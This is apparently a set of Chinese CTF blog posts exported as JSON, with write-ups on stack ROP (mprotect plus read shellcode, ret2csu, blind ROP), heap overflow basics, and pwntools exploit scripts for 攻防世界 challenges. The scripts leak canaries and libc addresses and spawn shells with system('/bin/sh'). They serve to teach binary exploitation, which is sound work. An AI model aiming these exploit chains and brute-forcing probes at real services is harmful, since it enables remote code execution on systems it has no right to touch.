jmp 到 mprotect,为了完整的回来,所以在mprotect地址后在压入一个返回地址.2.在32为系统中传参是使用栈传参,择第一个参数先push,第二个再push....所以基本的payload可以构思如下:payload &#x3D; &#39;A&#39; + 0x38 + p32(mprotect_addr)payload +&#x3D; p32(ret_addr) + p32(argu1) + p32(argu2) +p32 (argu3)这里的mprotect_addr就是我们要跳转到mprotect函数的地址ret_addr 为 mprotect函数执行完后的地址.argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (edb-debuger查看得到)argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 0x1000 (0x1000通过程序启动时查看该内存块的大小的到的)argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 7 &#x3D; 4 + 2 +1 (rwx)为了后续再能使用栈ret,我们的构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈完好.#注意：这里的三个pop应该是将调用函数传参的那三个push进去的参数弹出，这样的话就会使得堆栈平衡，因为调用函数的时候指针应该指向返回地址，如果不pop * 3 的话就不会返回，导致堆栈不平衡。（仅仅是个人理解）使用 ROPgadget --binary get_started_3dsctf_2016 --only &#39;pop|ret&#39; | grep pop存在pop的一些指令地址,可以发现:0x0804f460 : pop ebx ; pop esi ; pop ebp ; ret那我们就得到了该地址.上面的ret_addr就填写0x0804f460而现在的payload就可以为:payload &#x3D; &#39;A&#39; + 0x38 + p32(mprotect_addr)payload +&#x3D; p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)payload +&#x3D; p32(ret_addr2)ret_addr2 即为执行完mprotect函数即弹出栈后的返回地址.我们也就可以再次利用栈的ret来控制eip,即为下一个函数read的地址. 如何向内存写入shellcode12345678910111213141516171819202122好下面我们就要构思如何将自己的shellcode写入内存再执行,使用read函数写入.read函数原型:ssize_t read(int fd, void *buf, size_t count);fd 设为0时就可以从输入端读取内容 设为0buf 设为我们想要执行的内存地址 设为我们已找到的内存地址0x80EB000size 适当大小就可以 设为0x100就可以了现在的payload也就可以构造如下payload &#x3D; &#39;A&#39; + 0x38 + p32(mprotect_addr)payload +&#x3D; p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)payload +&#x3D; p32(read_addr) + p32(ret_addr2) + p32(0x0) + p32(mem_addr) +p32 (0x100)read函数也跟mprotect一样的例子,就是 call &#x3D; push + jmp.read_addr 后面的一个ret_addr2就是执行完read函数后的返回地址.再次使用pop3_ret弹掉3个已用的参数,接着还可以利用栈ret来控制eip跳转到mem_addr执行自己的shellcode, payload如下.payload &#x3D; &#39;A&#39; + 0x38 + p32(mprotect_addr)payload +&#x3D; p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)payload +&#x3D; p32(read_addr) + p32(ret_addr2) + p32(0x0) + p32(mem_addr) +p32 (0x100)payload +&#x3D; p32(mem_addr)然而在执行read函数时就可以输入shellcode,即payload2为:payload_sh &#x3D; asm(shellcraft.sh(),arch &#x3D; &#39;i386&#39;, os &#x3D; &#39;linux&#39;)","categories":[],"tags":[]},{"title":"堆溢出","slug":"堆溢出","date":"2020-01-30T06:01:39.717Z","updated":"2020-01-31T08:46:46.403Z","comments":true,"path":"2020/01/30/堆溢出/","link":"","permalink":"http://summern.club/2020/01/30/%E5%A0%86%E6%BA%A2%E5%87%BA/","excerpt":"堆溢出略写","text":"堆溢出略写 前言： 众所周知堆和栈一点都不一样，但是这也忒不一样了 栈溢出是溢出储存单元 然而堆溢出在我这个垃圾看来应该是从一个申请的堆块溢出到相邻物理地址的新的堆块中去 堆的申请事由低地址向高地址创建的 1.基本策略 覆盖与其 物理相邻的下一个 chunk 的内容。 prev_size size，主要有三个比特位，以及该堆块真正的大小。 NON_MAIN_ARENA IS_MAPPED PREV_INUSE the True chunk size chunk content，从而改变程序固有的执行流。 利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。 注意，前面的pre_sive与size是按照机器字长来计算的，不同的字长长度不同 2.例子12345678910#include &lt;stdio.h&gt;int main(void) &#123; char *chunk; chunk=malloc(24); puts(\"Get input:\"); gets(chunk); return 0;&#125; 这个程序的主要目的是调用 malloc 分配一块堆上的内存，之后向这个堆块中写入一个字符串，如果输入的字符串过长会导致溢出 chunk 的区域并覆盖到其后的 top chunk 之中(实际上 puts 内部会调用 malloc 分配堆内存，覆盖到的可能并不是 top chunk)。 123450x602000: 0x0000000000000000 0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D;chunk0x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x0000000000020fe1 &lt;&#x3D;&#x3D;&#x3D;top chunk0x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 0x0000000000000000 进行写入 ‘A’*100 123450x602000: 0x0000000000000000 0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D;chunk0x602010: 0x4141414141414141 0x41414141414141410x602020: 0x4141414141414141 0x4141414141414141 &lt;&#x3D;&#x3D;&#x3D;top chunk(已被溢出)0x602030: 0x4141414141414141 0x41414141414141410x602040: 0x4141414141414141 0x4141414141414141 3.总结寻找堆分配函数¶通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的。 1234calloc(0x20);&#x2F;&#x2F;等同于ptr&#x3D;malloc(0x20);memset(ptr,0,0x20); 除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。 123456789#include &lt;stdio.h&gt;int main(void) &#123; char *chunk,*chunk1; chunk&#x3D;malloc(16); chunk1&#x3D;realloc(chunk,32); return 0;&#125; realloc的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作 当realloc(ptr,size)的size不等于ptr的size时 如果申请size&gt;原来size 如果chunk与top chunk相邻，直接扩展这个chunk到新size大小 如果chunk与top chunk不相邻，相当于free(ptr),malloc(new_size) 如果申请size&lt;原来size 如果相差不足以容得下一个最小chunk(64位下32个字节，32位下16个字节)，则保持不变 如果相差可以容得下一个最小chunk，则切割原chunk为两部分，free掉后一部分 当realloc(ptr,size)的size等于0时，相当于free(ptr) 当realloc(ptr,size)的size等于ptr的size，不进行任何操作 寻找危险函数¶通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里。 常见的危险函数如下 输入 gets，直接读取一行，忽略 &#39;\\x00&#39; scanf vscanf 输出 sprintf 字符串 strcpy，字符串复制，遇到 &#39;\\x00&#39; 停止 strcat，字符串拼接，遇到 &#39;\\x00&#39; 停止 bcopy 确定填充长度¶这一部分主要是计算我们开始写入的地址与我们所要覆盖的地址之间的距离。 一个常见的误区是malloc的参数等于实际分配堆块的大小，但是事实上 ptmalloc 分配出来的大小是对齐的。这个长度一般是字长的2倍，比如32位系统是8个字节，64位系统是16个字节。但是对于不大于2倍字长的请求，malloc会直接返回2倍字长的块也就是最小chunk，比如64位系统执行malloc(0)会返回用户区域为16字节的块。 12345678910#include &lt;stdio.h&gt;int main(void) &#123; char *chunk; chunk&#x3D;malloc(0); puts(&quot;Get input:&quot;); gets(chunk); return 0;&#125; 12345&#x2F;&#x2F;根据系统的位数，malloc会分配8或16字节的用户空间0x602000: 0x0000000000000000 0x00000000000000210x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x0000000000020fe10x602030: 0x0000000000000000 0x0000000000000000 注意用户区域的大小不等于 chunk_hear.size，chunk_hear.size=用户区域大小+2*字长 还有一点是之前所说的用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个chunk的prev_size字段储存内容。回头再来看下之前的示例代码 12345678910#include &lt;stdio.h&gt;int main(void) &#123; char *chunk; chunk&#x3D;malloc(24); puts(&quot;Get input:&quot;); gets(chunk); return 0;&#125; 观察如上代码，我们申请的chunk大小是24个字节。但是我们将其编译为64位可执行程序时，实际上分配的内存会是16个字节而不是24个。 1230x602000: 0x0000000000000000 0x00000000000000210x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x0000000000020fe1 16个字节的空间是如何装得下24个字节的内容呢？答案是借用了下一个块的pre_size域。我们可来看一下用户申请的内存大小与glibc中实际分配的内存大小之间的转换。 123456&#x2F;* pad request bytes into a usable size -- internal version *&#x2F;&#x2F;&#x2F;MALLOC_ALIGN_MASK &#x3D; 2 * SIZE_SZ -1#define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) 当req=24时，request2size(24)=32。而除去chunk 头部的16个字节。实际上用户可用chunk的字节数为16。而根据我们前面学到的知识可以知道chunk的pre_size仅当它的前一块块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个chunk的prev_size字段，正好24个字节。 实际上 ptmalloc 分配内存是以双字为基本单位，以64位系统为例，分配出来的空间是16的整数倍，即用户申请的chunk都是16字节对齐的。 (注意机器字长的影响)","categories":[],"tags":[]},{"title":"堆的数据结构","slug":"堆的数据结构","date":"2020-01-20T14:16:02.927Z","updated":"2020-01-20T14:24:40.918Z","comments":true,"path":"2020/01/20/堆的数据结构/","link":"","permalink":"http://summern.club/2020/01/20/%E5%A0%86%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","excerpt":"堆的数据结构","text":"堆的数据结构 最近状态不大好，栈溢出也学一阵子了，向堆的方向前进吧 先简单的记录一下知识结构 1.malloc_chunk2.chunkchunk的数据结构1.使用时2.空闲时间3.bin1.fast bin2.其他的2.small bin3.large bin4.unsorted bin4.arena5.heap_info6.malloc_state","categories":[],"tags":[]},{"title":"中级ROP","slug":"中级ROP","date":"2020-01-14T14:38:29.610Z","updated":"2020-01-14T14:38:48.131Z","comments":true,"path":"2020/01/14/中级ROP/","link":"","permalink":"http://summern.club/2020/01/14/%E4%B8%AD%E7%BA%A7ROP/","excerpt":"中级ROP","text":"中级ROP 64位程序传参 当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样 ret2__libc_csu_init看ctf-wiki 其中一个关于rsp移动的问题，就是payload中有一个 “a” * 0x38的具体解释见如下博客，感谢大佬 https://blog.csdn.net/zszcr/article/details/79833898 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *from LibcSearcher import LibcSearcher#context.log_level = 'debug'level5 = ELF('./level5')sh = process('./level5')write_got = level5.got['write']read_got = level5.got['read']main_addr = level5.symbols['main']bss_base = level5.bss()csu_front_addr = 0x0000000000400600csu_end_addr = 0x000000000040061Afakeebp = 'b' * 8def csu(rbx, rbp, r12, r13, r14, r15, last): #这里的r12 r13 r14 分别为第三 第二 第一个参数 # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = 'a' * 0x80 + fakeebp payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64( r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += 'a' * 0x38 payload += p64(last) sh.send(payload) sleep(1)sh.recvuntil('Hello, World\\n')## RDI, RSI, RDX, RCX, R8, R9, more on the stack## write(1,write_got,8)csu(0, 1, write_got, 8, write_got, 1, main_addr)write_addr = u64(sh.recv(8))libc = LibcSearcher('write', write_addr)libc_base = write_addr - libc.dump('write')execve_addr = libc_base + libc.dump('execve')log.success('execve_addr ' + hex(execve_addr))##gdb.attach(sh)## read(0,bss_base,16)## read execve_addr and /bin/sh\\x00sh.recvuntil('Hello, World\\n')csu(0, 1, read_got, 16, bss_base, 0, main_addr)sh.send(p64(execve_addr) + '/bin/sh\\x00')sh.recvuntil('Hello, World\\n')## execve(bss_base+8)csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)sh.interactive() 程序代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243.text:00000000004005C0 ; void _libc_csu_init(void).text:00000000004005C0 public __libc_csu_init.text:00000000004005C0 __libc_csu_init proc near ; DATA XREF: _start+16\u0018o.text:00000000004005C0 push r15.text:00000000004005C2 push r14.text:00000000004005C4 mov r15d, edi.text:00000000004005C7 push r13.text:00000000004005C9 push r12.text:00000000004005CB lea r12, __frame_dummy_init_array_entry.text:00000000004005D2 push rbp.text:00000000004005D3 lea rbp, __do_global_dtors_aux_fini_array_entry.text:00000000004005DA push rbx.text:00000000004005DB mov r14, rsi.text:00000000004005DE mov r13, rdx.text:00000000004005E1 sub rbp, r12.text:00000000004005E4 sub rsp, 8.text:00000000004005E8 sar rbp, 3.text:00000000004005EC call _init_proc.text:00000000004005F1 test rbp, rbp.text:00000000004005F4 jz short loc_400616.text:00000000004005F6 xor ebx, ebx.text:00000000004005F8 nop dword ptr [rax+rax+00000000h].text:0000000000400600.text:0000000000400600 loc_400600: ; CODE XREF: __libc_csu_init+54\u0019j.text:0000000000400600 mov rdx, r13.text:0000000000400603 mov rsi, r14.text:0000000000400606 mov edi, r15d.text:0000000000400609 call qword ptr [r12+rbx*8].text:000000000040060D add rbx, 1.text:0000000000400611 cmp rbx, rbp.text:0000000000400614 jnz short loc_400600.text:0000000000400616.text:0000000000400616 loc_400616: ; CODE XREF: __libc_csu_init+34\u0018j.text:0000000000400616 add rsp, 8.text:000000000040061A pop rbx.text:000000000040061B pop rbp.text:000000000040061C pop r12.text:000000000040061E pop r13.text:0000000000400620 pop r14.text:0000000000400622 pop r15.text:0000000000400624 retn.text:0000000000400624 __libc_csu_init endp 可以通过不同的地址对不同的寄存器使用 使用不同的gadgets 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647gef➤ x&#x2F;5i 0x000000000040061A 0x40061a &lt;__libc_csu_init+90&gt;: pop rbx 0x40061b &lt;__libc_csu_init+91&gt;: pop rbp 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14gef➤ x&#x2F;5i 0x000000000040061b 0x40061b &lt;__libc_csu_init+91&gt;: pop rbp 0x40061c &lt;__libc_csu_init+92&gt;: pop r12 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15gef➤ x&#x2F;5i 0x000000000040061A+3 0x40061d &lt;__libc_csu_init+93&gt;: pop rsp 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret gef➤ x&#x2F;5i 0x000000000040061e 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nopgef➤ x&#x2F;5i 0x000000000040061f 0x40061f &lt;__libc_csu_init+95&gt;: pop rbp 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nopgef➤ x&#x2F;5i 0x0000000000400620 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0]gef➤ x&#x2F;5i 0x0000000000400621 0x400621 &lt;__libc_csu_init+97&gt;: pop rsi 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nopgef➤ x&#x2F;5i 0x000000000040061A+9 0x400623 &lt;__libc_csu_init+99&gt;: pop rdi 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0] 0x400630 &lt;__libc_csu_fini&gt;: repz ret 例题： 2016 XDCTF pwn100 脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from pwn import *p = process('./pwn-100')elf = ELF('./pwn-100')puts_addr = elf.plt['puts']read_addr = elf.got['read']start_addr = 0x400550pop_rdi = 0x400763 gadget_1 = 0x40075agadget_2 = 0x400740bin_sh_addr = 0x60107c #存储/bin/sh的地址def leak(addr): up = '' content = '' payload = 'A'*0x48 payload += p64(pop_rdi) #这里使用了pop_rdi payload += p64(addr) payload += p64(puts_addr) payload += p64(start_addr) payload = payload.ljust(200, 'B') p.send(payload) p.recvuntil(\"bye~\\n\") while True: #防止未接受完整传回的数据 c = p.recv(numb=1, timeout=0.1) if up == '\\n' and c == \"\": content = content[:-1]+'\\x00' break else: content += c up = c content = content[:4] return contentd = DynELF(leak, elf=elf) #其实可以使用libsearch来搜索system与bin/shsystem_addr = d.lookup('system', 'libc')#调用read函数payload = \"A\"*0x48payload += p64(gadget_1)payload += p64(0)payload += p64(1)payload += p64(read_addr)payload += p64(8)payload += p64(bin_sh_addr)payload += p64(0)payload += p64(gadget_2)payload += '\\x00'*56payload += p64(start_addr)payload = payload.ljust(200, \"B\")#输入/bin/shp.send(payload)p.recvuntil('bye~\\n')p.send(\"/bin/sh\\x00\")#调用system函数payload = \"A\"*72 payload += p64(pop_rdi) payload += p64(bin_sh_addr) payload += p64(system_addr) payload = payload.ljust(200, \"B\") p.send(payload)p.interactive() ret2reg1.查看溢出函返回时哪个寄存值指向溢出缓冲区空间 2.然后反编译二进制，查找 call reg 或者jmp reg指令，将 EIP 设置为该指令地址 3.reg所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的 拿一个例题： HCTF2016的pwn 1.我们先爆破出栈溢出的长度 12345678910111213141516def getbufferflow_length(): i = 1 while 1: try: sh = remote('127.0.0.1', 9999) sh.recvuntil('WelCome my friend,Do you know password?\\n') sh.send(i * 'a') output = sh.recv() sh.close() if not output.startswith('No password'): return i - 1 else: i += 1 except EOFError: #如果报错，会显示EOFErrot sh.close() return i - 1 2.爆破我们需要的gadget 123456789101112131415def get_stop_addr(length): addr = 0x400000 while 1: try: sh = remote('127.0.0.1', 9999) sh.recvuntil('password?\\n') payload = 'a' * length + p64(addr) sh.sendline(payload) sh.recv() sh.close() print 'one success addr: 0x%x' % (addr) #若有正常返回，那么存在正确的add，输入即可，若没有，则报错 return addr except Exception: addr += 1 sh.close() 3.识别brop gadgets 下面，我们根据上面介绍的原理来得到对应的brop gadgets地址。构造如下，get_brop_gadget是为了得到可能的brop gadget，后面的check_brop_gadget是为了检查。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546def get_brop_gadget(length, stop_gadget, addr): try: sh = remote('127.0.0.1', 9999) sh.recvuntil('password?\\n') payload = 'a' * length + p64(addr) + p64(0) * 6 + p64( stop_gadget) + p64(0) * 10 sh.sendline(payload) content = sh.recv() sh.close() print content # stop gadget returns memory if not content.startswith('WelCome'): return False return True except Exception: sh.close() return Falsedef check_brop_gadget(length, addr): try: sh = remote('127.0.0.1', 9999) sh.recvuntil('password?\\n') payload = 'a' * length + p64(addr) + 'a' * 8 * 10 sh.sendline(payload) content = sh.recv() sh.close() return False except Exception: sh.close() return True##length = getbufferflow_length()length = 72##get_stop_addr(length)stop_gadget = 0x4006b6addr = 0x400740while 1: print hex(addr) if get_brop_gadget(length, stop_gadget, addr): print 'possible brop gadget: 0x%x' % addr if check_brop_gadget(length, addr): print 'success brop gadget: 0x%x' % addr break addr += 1 在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为\\x7fELF 4.所以我们可以接着去找put函数的地址即put@plt 我们找到的gadget为libc_csu_init中的可以操作6个寄存器的 所以我们可以使用pop_rdi = brop_add + 9来获得 1payload = 'A'*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget) 具体函数: 123456789101112131415161718def get_puts_addr(length, rdi_ret, stop_gadget): addr = 0x400000 while 1: print hex(addr) sh = remote('127.0.0.1', 9999) sh.recvuntil('password?\\n') payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64( addr) + p64(stop_gadget) sh.sendline(payload) try: content = sh.recv() if content.startswith('\\x7fELF'): print 'find puts@plt addr: 0x%x' % addr return addr sh.close() addr += 1 except Exception: sh.close() 5.寻找put@got 123456789101112131415161718192021222324252627282930313233343536373839404142def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget): sh = remote('127.0.0.1', 9999) payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64( puts_plt) + p64(stop_gadget) sh.recvuntil('password?\\n') sh.sendline(payload) try: data = sh.recv() sh.close() try: data = data[:data.index(\"\\nWelCome\")] except Exception: data = data if data == \"\": data = '\\x00' return data except Exception: sh.close() return None##length = getbufferflow_length()length = 72##stop_gadget = get_stop_addr(length)stop_gadget = 0x4006b6##brop_gadget = find_brop_gadget(length,stop_gadget)brop_gadget = 0x4007bardi_ret = brop_gadget + 9##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)puts_plt = 0x400560addr = 0x400000result = \"\"while addr &lt; 0x401000: print hex(addr) data = leak(length, rdi_ret, puts_plt, addr, stop_gadget) if data is None: continue else: result += data addr += len(data) #这里的len(data)若为\\x00则为1，没毛病。若不为\\x00为其他字节，因为一个地址对应一个储存单元对应一字节，而且len(data)为字节数，所以输入多少个字节就往后移动多少字节就okwith open('code', 'wb') as f: f.write(result) 可以根据输出的数据转化为汇编来看plt表中的got地址 之后在通过put@plt泄露出puts@got中的内容（即libc中的地址） 123456789101112131415161718192021222324252627##length = getbufferflow_length()length = 72##stop_gadget = get_stop_addr(length)stop_gadget = 0x4006b6##brop_gadget = find_brop_gadget(length,stop_gadget)brop_gadget = 0x4007bardi_ret = brop_gadget + 9##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)puts_plt = 0x400560##leakfunction(length, rdi_ret, puts_plt, stop_gadget)puts_got = 0x601018sh = remote('127.0.0.1', 9999)sh.recvuntil('password?\\n')payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64( stop_gadget)sh.sendline(payload)data = sh.recvuntil('\\nWelCome', drop=True)puts_addr = u64(data.ljust(8, '\\x00'))libc = LibcSearcher('puts', puts_addr)libc_base = puts_addr - libc.dump('puts')system_addr = libc_base + libc.dump('system')binsh_addr = libc_base + libc.dump('str_bin_sh')payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64( system_addr) + p64(stop_gadget)sh.sendline(payload)sh.interactive()","categories":[],"tags":[]},{"title":"攻防世界进阶区","slug":"攻防世界进阶区","date":"2020-01-13T15:09:26.763Z","updated":"2020-01-18T13:21:57.192Z","comments":true,"path":"2020/01/13/攻防世界进阶区/","link":"","permalink":"http://summern.club/2020/01/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6%E5%8C%BA/","excerpt":"攻防世界进阶区","text":"攻防世界进阶区 1. dice _ game同新手区的那个随机数问题 exp： 12345678910111213141516171819202122232425262728#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *from ctypes import *file_name = './dice_game'libc_name = './libc.so.6'ip = '111.198.29.45'port = '43605'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)libc = cdll.LoadLibrary(\"libc.so.6\")p = remote(ip,port)libc.srand(1)p.recvuntil(\"Welcome, let me know your name: \")payload = \"a\" * (0x40) + p64(1)p.sendline(payload)for i in range(50): p.sendlineafter(\"Give me the point(1~6): \",str(libc.rand()%6 + 1))print p.recvall() 2.forgot使用@字符绕过下面的嵌套着swich语句的for循环 使得v14一直为1 从而使后面的调用函数的地址一直是v3的值 我们只需栈溢出覆盖v3的值为危险函数地址就好 123456789101112131415161718192021222324#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './1'libc_name = ''ip = '111.198.29.45'port = '59557'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)p = remote(ip,port)system = 0x80486ccpayload = \"@\" * 32 + p32(system)payload1 = \"summerN\"p.sendlineafter(\"&gt; \",\"a\")p.sendlineafter(\"&gt; \",payload)print p.recvall() 3.warmup先看一下sprintf()sprintf指的是字符串格式化命令，函数声明为 int sprintf(char *string, char *format[,argument,…]);，主要功能是把格式化的数据写入某个字符串中，即发送格式化输出到 string 所指向的字符串。sprintf是个变参函数。使用sprintf 对于写入buffer的字符数是没有限制的，这就存在了buffer溢出的可能性。解决这个问题，可以考虑使用 snprintf函数，该函数可对写入字符数做出限制。 题目直接通过sprintf函数泄露出了危险函数地址 exp: 4.Mary_Morton步骤： 1.通过格式化字符串漏洞泄露cannary 2.绕过cannary执行危险函数 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './1'libc_name = ''ip = '111.198.29.45'port = '57071'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)#p=process(file_name)p=remote(ip,port)alarm_add = 0x4008DAoffset = 6offset1 = offset + (0x90-8)/8#gdb.attach(p)p.recvuntil(\"3. Exit the battle \\n\")p.sendline(\"2\")payload = \"%23$p\"p.sendline(payload)cann = int(p.recv(18),16)print cannp.recvuntil(\"3. Exit the battle \\n\")payload1 = 'a'*(0x88) + p64(cann) + p64(1) + p64(0x4008DA) #p64里面不能有字符串p.sendline(\"1\")p.sendline(payload1)#p.recvline()p.interactive() 5.pwn1这个题的思路： 1.通过自带的puts函数泄露cannary 2.构造简单的rop泄露libc版本与基地址 3.拿到shell 注意： 本题中，如果想执行我们覆盖掉的返回地址，必须使程序结束，即s=3 因为我们覆盖的是main函数的返回地址，如果一直进行while循环的话是不可能进行return的 上exp： 别看exp很长，因为我走了很多弯路，其实exp很简单 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/python2#encoding:utf-8#__author__='summerN@DL&amp;S'from pwn import *from LibcSearcher import *file_name = './babystack'libc_name = './libc-2.23.so'ip = '111.198.29.45'port = '45399'# context.arch = 'amd64'context.log_level='debug'context.terminal=['tmux','split','-h']#libc = ELF(libc_name)elf = ELF(file_name)p = remote(ip,port)#p = process(file_name)pop_rdi = 0x0000000000400a93main_addr = 0x400908puts_plt = elf.plt['puts']puts_got = elf.got['puts']print hex(puts_plt)p.recvuntil(\"&gt;&gt; \")p.sendline(\"1\")payload1 = \"a\" * (0x90-8) + \"a\"p.send(payload1)p.recvuntil(\"&gt;&gt; \")p.sendline(\"2\")p.recvuntil(\"a\" * (0x90 -7))#print u64(p.recv(7).strip(\"\\n\").rjust(8,\"\\x00\"))cannary = hex(u64(p.recv(7).strip(\"\\n\").rjust(8,\"\\x00\")))#print p.recvline().strip(\"\\n\").ljust(8,\"\\x00\") print cannary'''p.recvuntil(\"&gt;&gt; \")#payload2 = \"a\" * (0x90-8) + p64(int(cannary,16)) + \"b\" * 8 + payload2 = p64(puts_got)p.sendline(\"1\")p.send(payload2)p.recvuntil(\"&gt;&gt; \")p.sendline(\"2\")start_add = u64(p.recv().ljust(8,\"\\x00\"))print hex(start_add)base_add = start_add - libc.symbols['__libc_start_main']print hex(libc.symbols['__libc_start_main'])print hex(base_add)sys_add = base_add + libc.symbols['system']bin_add = base_add + libc.search(\"/bin/sh\\x00\").next()'''p.recvuntil(\"&gt;&gt; \")payload2 = 'a'*0x88+p64(int(cannary,16))+'a'*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)p.sendline(\"1\")p.sendline(payload2)p.recvuntil(\"&gt;&gt; \")p.sendline(\"3\")start_add = u64(p.recv(8).ljust(8,'\\x00'))libc = LibcSearcher(\"puts\",start_add)libc_add = start_add - libc.dump(\"puts\")#print start_add#base_add = start_add - libc.symbols['puts']#print hex(libc.symbols['puts'])#print hex(base_add)sys_add = libc_add + libc.dump(\"system\")bin_add = libc_add + libc.dump(\"str_bin_sh\")p.recvuntil(\"&gt;&gt; \")p.sendline(\"1\")payload3 = \"a\" * (0x90-8) + p64(int(cannary,16)) + p64(1) + p64(pop_rdi) + p64(bin_add) + p64(sys_add)p.sendline(payload3)p.recvuntil(\"&gt;&gt; \")p.sendline(\"3\")p.interactive() 6.monkey64位程序 从来没遇见过引入js库的pwn题 引入了js，估计就是个js语言解释器 注意： 1.这道题目多了几个动态链接库，我先说明一下怎么在python+pwn中使用动态链接库： 1p = process([process_name], env=&#123;'LD_LIBRARY_PATH':'./'&#125;) 2. 1p.sendlineafter(&#39;js&gt;&#39;,&#39;os.system(\\&#39;cat flag\\&#39;)&#39;) 这里我们需要在后面加上\\进行转移 或者将里面的单引号转变为双引号 我们发现我们输入的js函数会执行，因此上exp： 1234567891011121314#encoding:utf-8from pwn import *context.log_level = 'debug'file_name = './js'ip = '111.198.29.45'port = '42533'p = remote(ip,port)#p = process([file_name], env=&#123;'LD_LIBRARY_PATH':'./'&#125;) #在本地中使用动态库p.sendlineafter('js&gt;','os.system(\\'cat flag\\')')p.recv()p.interactive() 